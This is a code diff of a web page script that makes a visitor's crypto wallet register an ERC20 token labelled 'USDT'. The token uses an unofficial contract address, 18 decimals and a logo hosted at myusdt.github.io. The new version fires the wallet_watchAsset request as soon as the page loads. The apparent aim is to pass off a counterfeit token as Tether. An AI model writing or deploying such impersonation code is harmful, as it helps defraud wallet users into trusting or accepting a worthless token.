@@ -1,52 +1,24 @@
 <script>
-  const TOKEN = {
-    address: "0x5ff19C505CCA2fa457cBd060f0CB5473C8400E70",
-    symbol: "USDT", // must match contract's symbol()
-    decimals: 18,
-    image: "https://myusdt.github.io/usdt/myusdt_logo.png"
-  };
-
-  const providers = [];
-
-  // Listen for wallet announcements
-  window.addEventListener("eip6963:announceProvider", (event) => {
-    providers.push(event.detail.provider);
-  });
-
-  // Request all wallets to announce themselves
-  window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-  function promptWalletChoice() {
-    if (providers.length === 0) {
-      document.getElementById("statusMsg").textContent =
-        "❌ No wallets detected. Please open this link inside MetaMask, Trust Wallet, or another Web3 wallet browser.";
-      return;
-    }
-
-    // Build a numbered list of wallet names
-    const names = providers.map((p, i) => `${i + 1}: ${p.info.name}`).join("\n");
-    const choice = prompt(`Select a wallet:\n${names}`);
-    const selected = providers[parseInt(choice) - 1];
-    if (!selected) return;
-
-    selected.request({
+  console.log("Script loaded");
+  if (window.ethereum) {
+    window.ethereum.request({
       method: "wallet_watchAsset",
-      params: { type: "ERC20", options: TOKEN }
-    })
-    .then((wasAdded) => {
-      document.getElementById("statusMsg").textContent = wasAdded
-        ? `🎉 ${TOKEN.symbol} added to your wallet!`
-        : "ℹ️ Token add was cancelled.";
-    })
-    .catch((err) => {
-      console.error(err);
-      document.getElementById("statusMsg").textContent =
-        "❌ Failed to add token: " + (err.message || err);
+      params: {
+        type: "ERC20",
+        options: {
+          address: "0x5ff19C505CCA2fa457cBd060f0CB5473C8400E70",
+          symbol: "USDT",
+          decimals: 18,
+          image: "https://myusdt.github.io/usdt/myusdt_logo.png"
+        }
+      }
+    }).then((added) => {
+      console.log("Token added:", added);
+    }).catch((err) => {
+      console.error("Add failed:", err);
     });
+  } else {
+    console.log("No wallet detected");
   }
-
-  // Wait a short moment for wallets to announce before prompting
-  window.addEventListener("load", () => {
-    setTimeout(promptWalletChoice, 500); // 0.5 second delay
-  });
 </script>
+
